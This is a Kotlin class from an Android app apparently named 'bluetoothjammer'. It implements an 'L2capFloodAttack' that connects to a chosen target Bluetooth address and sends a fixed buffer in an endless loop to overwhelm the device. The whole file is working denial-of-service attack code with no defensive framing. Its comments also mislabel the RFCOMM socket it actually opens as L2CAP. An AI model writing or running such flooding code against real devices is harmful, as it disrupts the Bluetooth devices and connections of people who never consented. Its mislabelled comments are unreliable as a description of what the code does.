package api

import android.annotation.SuppressLint
import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothDevice
import android.bluetooth.BluetoothSocket
import com.eikarna.bluetoothjammer.AttackActivity
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch
import java.io.IOException
import java.util.UUID
import java.util.concurrent.Executors

class L2capFloodAttack(private val targetAddress: String) {
    private val bluetoothAdapter: BluetoothAdapter = BluetoothAdapter.getDefaultAdapter()
    private var l2capSocket: BluetoothSocket? = null
    private val coroutineScope = CoroutineScope(Dispatchers.IO)
    private val executor = Executors.newCachedThreadPool()

    @SuppressLint("MissingPermission")
    fun startAttack() {
        val device: BluetoothDevice? = bluetoothAdapter.getRemoteDevice(targetAddress)
        if (device != null) {
            executor.execute(object : Runnable {
                override fun run() {
                    // Create a socket with L2CAP UUID
                    val uuid = device.uuids.get(0).uuid ?: UUID.randomUUID()
                    l2capSocket = device.createRfcommSocketToServiceRecord(uuid)
                    l2capSocket?.connect()

                    // Launch flood attack in parallel using coroutines
                    coroutineScope.launch {
                        floodAttack()
                    }
                }
            })
        }
    }

    private fun floodAttack() {
        val dataSize = 600 // Example data size
        val sendBuffer = ByteArray(dataSize) { ((it % 40) + 'A'.code.toByte()).toByte() }

        // Run flooding in a loop
        while (AttackActivity.isAttacking) { // Continue until the coroutine is cancelled
            // Send data
            l2capSocket?.outputStream?.write(sendBuffer)
            l2capSocket?.outputStream?.flush()
        }
    }

    @SuppressLint("MissingPermission")
    fun stopAttack() {
        coroutineScope.cancel() // Cancel the coroutine, stopping the attack
        closeConnection()
        bluetoothAdapter.startDiscovery()
    }

    private fun closeConnection() {
        try {
            l2capSocket?.close()
        } catch (e: IOException) {
            e.printStackTrace()
        }
    }
}
